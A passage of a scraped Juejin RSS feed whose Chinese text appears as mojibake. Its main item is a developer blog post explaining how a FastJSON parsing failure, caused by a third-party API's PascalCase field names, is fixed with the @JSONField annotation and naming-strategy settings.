<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fskills" target="_blank" title="https://code.claude.com/docs/zh-CN/skills" ref="nofollow noopener noreferrer">Skills æŠ€èƒ½</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fmcp" target="_blank" title="https://code.claude.com/docs/zh-CN/mcp" ref="nofollow noopener noreferrer">MCP MCP æœåŠ¡</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40anthropic-ai%2Fclaude-code" target="_blank" title="https://www.npmjs.com/package/@anthropic-ai/claude-code" ref="nofollow noopener noreferrer">@anthropic-ai/claude-code</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fslash-commands" target="_blank" title="https://code.claude.com/docs/zh-CN/slash-commands" ref="nofollow noopener noreferrer">Claude Code æ–œæ å‘½ä»¤</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fplugins" target="_blank" title="https://code.claude.com/docs/zh-CN/plugins" ref="nofollow noopener noreferrer">Claude Code æ’ä»¶</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fplugin-marketplaces" target="_blank" title="https://code.claude.com/docs/zh-CN/plugin-marketplaces" ref="nofollow noopener noreferrer">Claude Code æ’ä»¶å¸‚åœº</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡è¸©å‘ï¼šå±æ€§å¤§å°å†™ä¸åŒ¹é…å¯¼è‡´æ•°æ®è§£æå¤±è´¥ï¼Œä¸€ä¸ªæ³¨è§£æå®šï¼]]></title>    <link>https://juejin.cn/post/7594320543220432942</link>    <guid>https://juejin.cn/post/7594320543220432942</guid>    <pubDate>2026-01-13T01:06:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594320543220432942" data-draft-id="7594383365417648174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡è¸©å‘ï¼šå±æ€§å¤§å°å†™ä¸åŒ¹é…å¯¼è‡´æ•°æ®è§£æå¤±è´¥ï¼Œä¸€ä¸ªæ³¨è§£æå®šï¼"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-13T01:06:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç å¤´æ•´ç‚¹è–¯æ¡"/> <meta itemprop="url" content="https://juejin.cn/user/130170614974186"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡è¸©å‘ï¼šå±æ€§å¤§å°å†™ä¸åŒ¹é…å¯¼è‡´æ•°æ®è§£æå¤±è´¥ï¼Œä¸€ä¸ªæ³¨è§£æå®šï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/130170614974186/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç å¤´æ•´ç‚¹è–¯æ¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:06:25.000Z" title="Tue Jan 13 2026 01:06:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡è¸©å‘ï¼šå±æ€§å¤§å°å†™ä¸åŒ¹é…å¯¼è‡´æ•°æ®è§£æå¤±è´¥ï¼Œä¸€ä¸ªæ³¨è§£æå®šï¼</h2>
<p>æœ€è¿‘åœ¨å¯¹æ¥ä¸€ä¸ªå¤–éƒ¨æœåŠ¡çš„æ¥å£æ—¶ï¼Œé‡åˆ°äº†ä¸€ä¸ªçœ‹ä¼¼ç®€å•å´è€—æ—¶ä¸å°‘çš„å° bugâ€”â€”ç¬¬ä¸‰æ–¹æ¥å£è¿”å›çš„å­—æ®µæ˜¯å¤§å†™æ··åˆå‘½åï¼ˆæ¯”å¦‚<code>SubHospitalID</code>ï¼‰ï¼Œè€Œæˆ‘ä»¬é¡¹ç›®ä¸€è´¯éµå¾ªå°é©¼å³°å‘½åè§„èŒƒï¼ˆå®šä¹‰ä¸º<code>subHospitalId</code>ï¼‰ï¼Œå¯¼è‡´æ¥å£è°ƒç”¨åæ•°æ®å§‹ç»ˆè§£æå¤±è´¥ï¼Œå­—æ®µå€¼ä¸€ç›´ä¸º<code>null</code>ã€‚ç»è¿‡ä¸€ç•ªæ’æŸ¥ï¼Œæœ€ç»ˆç”¨ä¸€ä¸ªæ³¨è§£å°±è§£å†³äº†é—®é¢˜ã€‚ä»Šå¤©æŠŠæ•´ä¸ªè¿‡ç¨‹è®°å½•ä¸‹æ¥ï¼Œä¹Ÿæ¢³ç†ä¸‹å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡æ—¶å…³äºå­—æ®µå‘½åçš„é‚£äº›æ³¨æ„äº‹é¡¹ï¼Œé¿å…å¤§å®¶å†è¸©å‘ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€bug å¤ç°ï¼šæ•°æ®è§£æåå…³é”®å­—æ®µä¸º null</h3>
<p>è¿™æ¬¡å¯¹æ¥çš„æ˜¯æŸåŒ»ç–—ç³»ç»Ÿçš„æ¥å£ï¼Œéœ€æ±‚æ˜¯è·å–åŒ»é™¢ä¸‹å±ç§‘å®¤ä¿¡æ¯ã€‚æŒ‰ç…§å¯¹æ–¹æä¾›çš„æ¥å£æ–‡æ¡£ï¼Œè°ƒç”¨æ¥å£åä¼šè¿”å›å¦‚ä¸‹æ ¼å¼çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DJSON%25E6%2595%25B0%25E6%258D%25AE%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=JSON%E6%95%B0%E6%8D%AE&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">JSON æ•°æ®</a>ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-css" lang="css">{
  "<span class="hljs-selector-tag">Code</span>": <span class="hljs-number">200</span>,
  <span class="hljs-string">"Msg"</span>: <span class="hljs-string">"success"</span>,
  <span class="hljs-string">"Data"</span>: {
    "SubHospitalID": <span class="hljs-string">"1001"</span>,
    <span class="hljs-string">"SubHospitalName"</span>: <span class="hljs-string">"å†…ç§‘"</span>,
    <span class="hljs-string">"Address"</span>: <span class="hljs-string">"é—¨è¯Šæ¥¼3æ¥¼"</span>
  }
}

</code></pre>
<p>æˆ‘ä»¬é¡¹ç›®ä¸­ä½¿ç”¨ FastJSON è¿›è¡Œ JSON æ•°æ®è§£æï¼ŒæŒ‰ç…§ä¸€è´¯çš„å°é©¼å³°å‘½åè§„èŒƒï¼Œå®šä¹‰äº†æ¥æ”¶æ•°æ®çš„å®ä½“ç±»<code>SubHospitalDTO</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> lombok.<span class="hljs-property">Data</span>;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubHospitalDTO</span> {
    <span class="hljs-comment">// å¯¹åº”æ¥å£æ–‡æ¡£çš„SubHospitalID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> subHospitalId;
    <span class="hljs-comment">// å¯¹åº”æ¥å£æ–‡æ¡£çš„SubHospitalName</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> subHospitalName;
    <span class="hljs-comment">// å¯¹åº”æ¥å£æ–‡æ¡£çš„Address</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> address;
}

</code></pre>
<p>æ¥å£è°ƒç”¨ä»£ç å¾ˆå¸¸è§„ï¼Œé€šè¿‡ HTTP å·¥å…·è¯·æ±‚åï¼Œç”¨<code>JSON.parseObject(response, SubHospitalResponse.class)</code>ï¼ˆ<code>SubHospitalResponse</code>æ˜¯åŒ…å«<code>Data</code>å­—æ®µçš„å¤–å±‚å“åº”ç±»ï¼‰è¿›è¡Œè§£æã€‚</p>
<p>æœ¬ä»¥ä¸ºä¸€åˆ‡é¡ºåˆ©ï¼Œå¯è°ƒè¯•æ—¶å´å‘ç°ï¼Œ<code>subHospitalId</code>å’Œ<code>subHospitalName</code>å§‹ç»ˆä¸º<code>null</code>ï¼Œåªæœ‰<code>address</code>å­—æ®µèƒ½æ­£å¸¸è·å–åˆ°å€¼ã€‚è¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œæ˜æ˜å­—æ®µåå¯¹åº”ä¸Šäº†ï¼Œä¸ºä»€ä¹ˆä¼šè§£æå¤±è´¥å‘¢ï¼Ÿ</p>
<h3 data-id="heading-2">äºŒã€é—®é¢˜æ’æŸ¥ï¼šä» â€œå‘½åè§„èŒƒâ€ æ‰¾çªç ´å£</h3>
<p>é‡åˆ°æ•°æ®è§£æä¸º<code>null</code>çš„é—®é¢˜ï¼Œå¸¸è§„æ’æŸ¥æ€è·¯æ— éè¿™å‡ ç‚¹ï¼šä¸€æ˜¯å­—æ®µåæ˜¯å¦å’Œ JSON ä¸­çš„ key å®Œå…¨ä¸€è‡´ï¼›äºŒæ˜¯æ•°æ®ç±»å‹æ˜¯å¦åŒ¹é…ï¼›ä¸‰æ˜¯è§£æå·¥å…·çš„é…ç½®æ˜¯å¦æœ‰é—®é¢˜ã€‚</p>
<p>å…ˆæ£€æŸ¥æ•°æ®ç±»å‹ï¼Œæ¥å£è¿”å›çš„<code>SubHospitalID</code>æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæˆ‘ä»¬å®šä¹‰çš„<code>subHospitalId</code>ä¹Ÿæ˜¯<code>String</code>ï¼Œç±»å‹æ²¡é—®é¢˜ã€‚å†æ£€æŸ¥è§£æå·¥å…·é…ç½®ï¼Œæˆ‘ä»¬é¡¹ç›®ä¸­ FastJSON æ²¡æœ‰åšç‰¹æ®Šé…ç½®ï¼Œé»˜è®¤æ˜¯æŒ‰å­—æ®µååŒ¹é…è§£æï¼Œä¹‹å‰å¯¹æ¥å…¶ä»–æœåŠ¡ä¹Ÿä¸€ç›´æ­£å¸¸ï¼Œé…ç½®åº”è¯¥ä¹Ÿæ²¡é—®é¢˜ã€‚</p>
<p>é‚£å°±åªå‰©ä¸‹å­—æ®µååŒ¹é…çš„é—®é¢˜äº†ã€‚ä»”ç»†å¯¹æ¯”æ¥å£æ–‡æ¡£å’Œæˆ‘ä»¬çš„å®ä½“ç±»ï¼šæ¥å£æ–‡æ¡£æ˜¯<code>SubHospitalID</code>ï¼Œæˆ‘ä»¬æ˜¯<code>subHospitalId</code>ï¼›æ¥å£æ–‡æ¡£æ˜¯<code>SubHospitalName</code>ï¼Œæˆ‘ä»¬æ˜¯<code>subHospitalName</code>ã€‚è¡¨é¢ä¸Šçœ‹éƒ½æ˜¯ â€œé©¼å³°å‘½åâ€ï¼Œä½†å…¶å®å¤§å°å†™è§„åˆ™ä¸ä¸€æ ·â€”â€”ç¬¬ä¸‰æ–¹ç”¨çš„æ˜¯ â€œå¤§é©¼å³° + å¤§å†™ç¼©å†™â€ï¼ˆID å¤§å†™ï¼‰ï¼Œè€Œæˆ‘ä»¬ç”¨çš„æ˜¯çº¯å°é©¼å³°ï¼ˆid å°å†™ï¼‰ã€‚</p>
<p>ä¸ºäº†éªŒè¯çŒœæƒ³ï¼Œæˆ‘ä¸´æ—¶æŠŠå®ä½“ç±»ä¸­çš„<code>subHospitalId</code>æ”¹æˆäº†<code>SubHospitalID</code>ï¼Œé‡æ–°è°ƒè¯•åå‘ç°ï¼Œæ•°æ®æœç„¶èƒ½æ­£å¸¸è§£æäº†ï¼è¿™å°±ç¡®å®šäº†é—®é¢˜æ ¹æºï¼šç¬¬ä¸‰æ–¹æ¥å£å­—æ®µå‘½åæœªéµå¾ªçº¯å°é©¼å³°è§„èŒƒï¼Œå¯¼è‡´æˆ‘ä»¬æŒ‰å¸¸è§„å‘½åå®šä¹‰çš„å­—æ®µæ— æ³•å’Œ JSON ä¸­çš„ key åŒ¹é…ï¼Œæœ€ç»ˆè§£æå¤±è´¥ã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€è§£å†³æ–¹æ¡ˆï¼šç”¨ @JSONField æ³¨è§£æŒ‡å®šåŒ¹é…è§„åˆ™</h3>
<p>è™½ç„¶æŠŠå­—æ®µåæ”¹æˆå’Œç¬¬ä¸‰æ–¹ä¸€è‡´èƒ½è§£å†³é—®é¢˜ï¼Œä½†è¿™ä¼šç ´åæˆ‘ä»¬é¡¹ç›®ç»Ÿä¸€çš„å°é©¼å³°å‘½åè§„èŒƒï¼Œåç»­ç»´æŠ¤èµ·æ¥å¾ˆæ··ä¹±ï¼Œä¹Ÿä¸ç¬¦åˆå›¢é˜Ÿå¼€å‘ä¹ æƒ¯ã€‚é‚£æœ‰æ²¡æœ‰åŠæ³•æ—¢èƒ½ä¿æŒæˆ‘ä»¬çš„å‘½åè§„èŒƒï¼Œåˆèƒ½æ­£ç¡®åŒ¹é…ç¬¬ä¸‰æ–¹çš„å­—æ®µåå‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆå½“ç„¶æ˜¯æœ‰çš„ï¼FastJSON æä¾›äº†<code>@JSONField</code>æ³¨è§£ï¼Œé€šè¿‡è¯¥æ³¨è§£çš„<code>name</code>å±æ€§ï¼Œå¯ä»¥æŒ‡å®šå®ä½“ç±»å­—æ®µå¯¹åº” JSON ä¸­çš„ key åç§°ï¼Œå®Œç¾è§£å†³å­—æ®µåä¸åŒ¹é…çš„é—®é¢˜ã€‚</p>
<p>ä¿®æ”¹åçš„å®ä½“ç±»å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-keyword">annotation</span>.JSONField;
<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubHospitalDTO</span> {
    <span class="hljs-comment">// ç”¨@JSONFieldæŒ‡å®šå¯¹åº”JSONä¸­çš„SubHospitalID</span>
    <span class="hljs-meta">@JSONField(name = <span class="hljs-string">"SubHospitalID"</span>)</span>
    <span class="hljs-keyword">private</span> String subHospitalId;
    <span class="hljs-comment">// ç”¨@JSONFieldæŒ‡å®šå¯¹åº”JSONä¸­çš„SubHospitalName</span>
    <span class="hljs-meta">@JSONField(name = <span class="hljs-string">"SubHospitalName"</span>)</span>
    <span class="hljs-keyword">private</span> String subHospitalName;
    <span class="hljs-comment">// å­—æ®µåå®Œå…¨ä¸€è‡´ï¼Œæ— éœ€æ³¨è§£</span>
    <span class="hljs-keyword">private</span> String address;
}

</code></pre>
<p>ä¿®æ”¹åé‡æ–°è°ƒè¯•ï¼Œæ‰€æœ‰å­—æ®µéƒ½èƒ½æ­£å¸¸è§£æï¼Œæ—¢ä¿æŒäº†æˆ‘ä»¬é¡¹ç›®çš„å°é©¼å³°å‘½åè§„èŒƒï¼Œåˆé€‚é…äº†ç¬¬ä¸‰æ–¹çš„å­—æ®µå‘½åæ ¼å¼ï¼Œé—®é¢˜åœ†æ»¡è§£å†³ã€‚</p>
<h3 data-id="heading-4">å››ã€æ‹“å±•å»¶ä¼¸ï¼šå¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡çš„å‘½åé€‚é…æŠ€å·§</h3>
<p>è¿™æ¬¡çš„å° bug çœ‹ä¼¼ç®€å•ï¼Œå´æš´éœ²äº†å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡æ—¶ä¸€ä¸ªå¸¸è§çš„ç—›ç‚¹â€”â€”ä¸åŒå›¢é˜Ÿçš„å‘½åè§„èŒƒå·®å¼‚ã€‚é™¤äº†ä¸Šè¿°çš„ â€œå¤§é©¼å³° + å¤§å†™ç¼©å†™â€vsâ€œçº¯å°é©¼å³°â€ï¼Œè¿˜å¯èƒ½é‡åˆ°ä»¥ä¸‹å‡ ç§æƒ…å†µï¼Œè¿™é‡Œæ•´ç†äº†å¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<h4 data-id="heading-5">1. ä¸‹åˆ’çº¿å‘½åï¼ˆè›‡å½¢å‘½åï¼‰vs é©¼å³°å‘½å</h4>
<p>å¾ˆå¤šç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆå°¤å…¶æ˜¯ Pythonã€PHP å¼€å‘çš„æœåŠ¡ï¼‰å–œæ¬¢ç”¨ä¸‹åˆ’çº¿å‘½åï¼Œæ¯”å¦‚<code>sub_hospital_id</code>ï¼Œè€Œæˆ‘ä»¬é¡¹ç›®ç”¨å°é©¼å³°<code>subHospitalId</code>ã€‚è¿™ç§æƒ…å†µåŒæ ·å¯ä»¥ç”¨<code>@JSONField</code>æ³¨è§£è§£å†³ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">@JSONField(<span class="hljs-attr">name</span> = <span class="hljs-string">"sub_hospital_id"</span>)
private String subHospitalId<span class="hljs-comment">;</span>

</code></pre>
<p>å¦‚æœå¯¹æ¥çš„æ¥å£å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸‹åˆ’çº¿å‘½åï¼Œä¹Ÿå¯ä»¥åœ¨ FastJSON è§£ææ—¶é…ç½®å…¨å±€çš„å‘½åè½¬æ¢è§„åˆ™ï¼Œé¿å…æ¯ä¸ªå­—æ®µéƒ½åŠ æ³¨è§£ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// å…¨å±€é…ç½®ï¼šä¸‹åˆ’çº¿è½¬å°é©¼å³°
ParserConfig.getGlobalInstance().<span class="hljs-attr">propertyNamingStrategy</span> = PropertyNamingStrategy.SnakeCase<span class="hljs-comment">;</span>

</code></pre>
<h4 data-id="heading-6">2. å…¨å¤§å†™å‘½å vs é©¼å³°å‘½å</h4>
<p>æœ‰äº›è€ç³»ç»Ÿçš„æ¥å£ä¼šç”¨å…¨å¤§å†™å­—æ®µåï¼Œæ¯”å¦‚<code>SUBHOSPITALID</code>ï¼ŒåŒæ ·é€šè¿‡<code>@JSONField</code>æ³¨è§£æŒ‡å®šå³å¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">@JSONField(<span class="hljs-attr">name</span> = <span class="hljs-string">"SUBHOSPITALID"</span>)
private String subHospitalId<span class="hljs-comment">;</span>

</code></pre>
<h4 data-id="heading-7">3. å­—æ®µåå®Œå…¨ä¸åŒ¹é…ï¼ˆæ— è§„å¾‹ï¼‰</h4>
<p>æ›´æç«¯çš„æƒ…å†µæ˜¯ï¼Œç¬¬ä¸‰æ–¹çš„å­—æ®µåå’Œæˆ‘ä»¬çš„å‘½åå®Œå…¨æ²¡æœ‰è§„å¾‹ï¼Œæ¯”å¦‚ç¬¬ä¸‰æ–¹ç”¨<code>H_ID</code>ï¼Œæˆ‘ä»¬ç”¨<code>subHospitalId</code>ï¼Œè¿™ç§æƒ…å†µåªèƒ½é€ä¸ªå­—æ®µç”¨<code>@JSONField</code>æ³¨è§£æŒ‡å®šå¯¹åº”å…³ç³»ï¼ŒåŒæ—¶å»ºè®®åœ¨æ³¨è§£ä¸ŠåŠ ä¸Šæ³¨é‡Šï¼Œè¯´æ˜å­—æ®µçš„å«ä¹‰å’Œå¯¹åº”å…³ç³»ï¼Œæ–¹ä¾¿åç»­ç»´æŠ¤ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å¯¹åº”ç¬¬ä¸‰æ–¹æ¥å£çš„H_IDï¼Œä»£è¡¨ä¸‹å±åŒ»é™¢ID</span>
<span class="hljs-meta">@JSONField(name = <span class="hljs-string">"H_ID"</span>)</span>
<span class="hljs-keyword">private</span> String subHospitalId;

</code></pre>
<h3 data-id="heading-8">äº”ã€æ€»ç»“ä¸åæ€</h3>
<p>è¿™æ¬¡çš„å° bug è™½ç„¶è§£å†³èµ·æ¥å¾ˆç®€å•ï¼Œä½†ç»™æˆ‘å¸¦æ¥äº†ä¸€äº›åæ€ï¼šå¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡æ—¶ï¼Œä¸èƒ½æƒ³å½“ç„¶åœ°æŒ‰è‡ªå·±å›¢é˜Ÿçš„è§„èŒƒæ¥ï¼Œä¸€å®šè¦æå‰æ³¨æ„è¿™äº›ç»†èŠ‚ï¼š</p>
<ol>
<li>
<p>ä»”ç»†ç ”è¯»æ¥å£æ–‡æ¡£ï¼Œé‡ç‚¹å…³æ³¨å­—æ®µåçš„å‘½åè§„åˆ™ã€æ•°æ®ç±»å‹ã€å¿…å¡«é¡¹ç­‰å…³é”®ä¿¡æ¯ï¼Œæœ€å¥½åœ¨å¼€å‘å‰åšä¸€æ¬¡å­—æ®µæ˜ å°„è¡¨ï¼Œé¿å…åç»­é—æ¼ï¼›</p>
</li>
<li>
<p>é‡åˆ°å‘½åä¸åŒ¹é…çš„æƒ…å†µï¼Œä¼˜å…ˆä½¿ç”¨è§£æå·¥å…·æä¾›çš„æ³¨è§£ï¼ˆå¦‚ FastJSON çš„<code>@JSONField</code>ã€Jackson çš„<code>@JsonProperty</code>ï¼‰è¿›è¡Œé€‚é…ï¼Œä¸è¦è½»æ˜“ç ´åè‡ªå·±é¡¹ç›®çš„å‘½åè§„èŒƒï¼›</p>
</li>
<li>
<p>å¦‚æœå¯¹æ¥çš„ç¬¬ä¸‰æ–¹æ¥å£è¾ƒå¤šä¸”å‘½åè§„åˆ™ç»Ÿä¸€ï¼Œå¯ä»¥é…ç½®å…¨å±€çš„å‘½åè½¬æ¢ç­–ç•¥ï¼Œæé«˜å¼€å‘æ•ˆç‡ï¼›</p>
</li>
<li>
<p>è°ƒè¯•æ—¶è‹¥é‡åˆ°æ•°æ®è§£æä¸º<code>null</code>çš„æƒ…å†µï¼Œä¼˜å…ˆæ’æŸ¥å­—æ®µååŒ¹é…å’Œæ•°æ®ç±»å‹é—®é¢˜ï¼Œè¿™æ˜¯æœ€å¸¸è§çš„è¯±å› ã€‚</p>
</li>
</ol>
<p>å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„ bug å¹¶ä¸å¯æ€•ï¼Œå…³é”®æ˜¯è¦æ‰¾åˆ°é—®é¢˜æ ¹æºï¼Œæ€»ç»“ç»éªŒæ•™è®­ï¼Œé¿å…ä»¥åå†çŠ¯ç±»ä¼¼çš„é”™è¯¯ã€‚å¸Œæœ›è¿™ç¯‡è®°å½•èƒ½å¸®åˆ°æ­£åœ¨å¯¹æ¥ç¬¬ä¸‰æ–¹æœåŠ¡çš„å°ä¼™ä¼´ï¼Œå°‘èµ°ä¸€äº›å¼¯è·¯ï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå­¦Javaæ‰‹è®°ï¼šMapé›†åˆï¼ŒArrayså·¥å…·ç±»å’ŒLambdaè¡¨è¾¾å¼]]></title>    